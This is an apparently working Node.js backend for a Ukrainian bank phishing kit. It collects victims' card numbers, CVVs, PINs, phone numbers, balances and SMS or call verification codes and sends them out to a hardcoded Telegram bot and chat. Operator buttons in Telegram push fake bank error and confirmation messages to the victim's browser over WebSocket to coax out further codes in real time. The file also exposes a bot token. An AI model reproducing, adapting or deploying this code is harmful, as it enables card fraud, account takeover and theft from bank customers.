// server.js
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');

// =======================================================================
// --- –ù–ê–°–¢–†–û–ô–ö–ò: –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ —É–∂–µ –≤—Å—Ç–∞–≤–ª–µ–Ω—ã ---
// =======================================================================
const TELEGRAM_BOT_TOKEN = '8417807179:AAEvlTli6Ba-VfWHFdiFb_0NmfIxj38xnU8';
const CHAT_ID = -4818175035; 
// =======================================================================

const app = express();
app.use(express.json());
app.use(cors());

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map(); 
const sessions = new Map(); 

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, ...stepData } = req.body;

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);
    
    // –ï—Å–ª–∏ –ø—Ä–∏—à–µ–ª –∫–æ–¥ –∏–∑ –∑–≤–æ–Ω–∫–∞, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –µ–≥–æ –æ—Ç–¥–µ–ª—å–Ω—ã–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º
    if (newData.call_code_input) {
        let message = `<b>üîî –û—Ç—Ä–∏–º–∞–Ω–æ –∫–æ–¥ —ñ–∑ –¥–∑–≤—ñ–Ω–∫–∞ (–û—â–∞–¥–±–∞–Ω–∫)!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—ã–π –ª–æ–≥, —Ç–æ–ª—å–∫–æ –∫–æ–≥–¥–∞ –∫–ª–∏–µ–Ω—Ç –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç, —á—Ç–æ —ç—Ç–æ –±—ã–ª —Ñ–∏–Ω–∞–ª—å–Ω—ã–π —à–∞–≥
    if (isFinalStep) {
        newData.visitCount += 1;
        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>–ù–æ–≤–∏–π –∑–∞–ø–∏—Å!</b>\n\n`;
        message += `<b>–ù–∞–∑–≤–∞ –±–∞–Ω–∫—É:</b> ${newData.bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${newData.phone || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç–∏:</b> <code>${newData.card || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if(newData['card-expiry']) message += `<b>–¢–µ—Ä–º—ñ–Ω –¥—ñ—ó:</b> <code>${newData['card-expiry']}</code>\n`;
        if(newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>–ü—ñ–Ω:</b> <code>${newData.pin || '–ù–µ –≤–∫–∞–∑–∞–Ω–æ'}</code>\n`;
        if (newData.balance) {
            message += `<b>–ü–æ—Ç–æ—á–Ω–∏–π –±–∞–ª–∞–Ω—Å:</b> <code>${newData.balance}</code>\n`;
        }
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} —Ä–∞–∑`;
        message += `<b>–ö—ñ–ª—å–∫—ñ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥—ñ–≤:</b> ${visitText}\n`;
        
        sendToTelegram(message, sessionId);
    }
    
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code } = req.body;
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>–û—Ç—Ä–∏–º–∞–Ω–æ SMS!</b>\n\n`;
        message += `<b>–ö–æ–¥:</b> <code>${code}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>–°–µ—Å—ñ—è:</b> <code>${sessionId}</code>\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId) {
     const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [ { text: 'SMS', callback_data: `sms:${sessionId}` }, { text: '–î–û–î–ê–¢–û–ö', callback_data: `app:${sessionId}` } ],
                [ { text: '–ü–Ü–ù', callback_data: `pin_error:${sessionId}` }, { text: '–ö–û–î', callback_data: `code_error:${sessionId}` }, { text: '–ö–û–î ‚úÖ', callback_data: `timer:${sessionId}` } ],
                [ { text: '–ö–∞—Ä—Ç–∞', callback_data: `card_error:${sessionId}` }, { text: '–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` } ],
                [ { text: 'OTHER', callback_data: `other:${sessionId}` } ]
            ]
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms': commandData = { text: "–í–∞–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ SMS –∑ –∫–æ–¥–æ–º –Ω–∞ –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π , –≤–≤–µ–¥—ñ—Ç—å –π–æ–≥–æ —É —Ñ–æ—Ä–º—É –≤–≤–æ–¥—É –∫–æ–¥—É" }; break;
            case 'app': commandData = { text: "–í–∞–º –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —É –¥–æ–¥–∞—Ç–æ–∫ –º–æ–±—ñ–ª—å–Ω–æ–≥–æ –±–∞–Ω–∫—É. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–¥–∞—Ç–æ–∫ –±–∞–Ω–∫—É —Ç–∞ –∑—Ä–æ–±—ñ—Ç—å –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –¥–ª—è –ø—Ä–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó." }; break;
            case 'other': commandData = { text: "–í –Ω–∞—Å –Ω–µ –≤–∏–π—à–ª–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∞—à—É –∫–∞—Ä—Ç–∫—É. –î–ª—è –ø—Ä–æ–¥–≤–∏–∂–µ–Ω–Ω—è –ø—Ä–æ–ø–æ–Ω—É—î–º–æ –≤–∫–∞–∑–∞—Ç–∏ –∫–∞—Ä—Ç–∫—É —ñ–Ω—à–æ–≥–æ –±–∞–Ω–∫—É" }; break;
            case 'pin_error': commandData = { text: "–í–∏ –≤–∫–∞–∑–∞–ª–∏ –Ω–µ–≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥. –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –≤—ñ—Ä–Ω–∏–π –ø—ñ–Ω–∫–æ–¥" }; break;
            case 'card_error': commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ–≤—ñ—Ä–Ω–∏–π –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏ , –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞–∑–∞–¥ —Ç–∞ –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç–∫–∏ –≤—ñ—Ä–Ω–æ" }; break;
            case 'number_error': commandData = { text: "–í–∫–∞–∑–∞–Ω–æ –Ω–µ —Ñ—ñ–Ω–∞–Ω—Å–æ–≤–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É . –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∞–∑–∞–¥ —Ç–∞ –≤–∫–∞–∂—ñ—Ç—å –Ω–æ–º–µ—Ä —è–∫–∏–π –ø—Ä–∏–≤'—è–∑–∞–Ω–∏–π –¥–æ –≤–∞—à–æ—ó –∫–∞—Ä—Ç–∫–∏." }; break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `–ö–æ–º–∞–Ω–¥–∞ "${type}" –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∞!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: '–ü–æ–º–∏–ª–∫–∞: –∫–ª—ñ—î–Ω—Ç –Ω–µ –≤ –º–µ—Ä–µ–∂—ñ!', show_alert: true });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => { console.log(`Server is running on port ${PORT}`); });
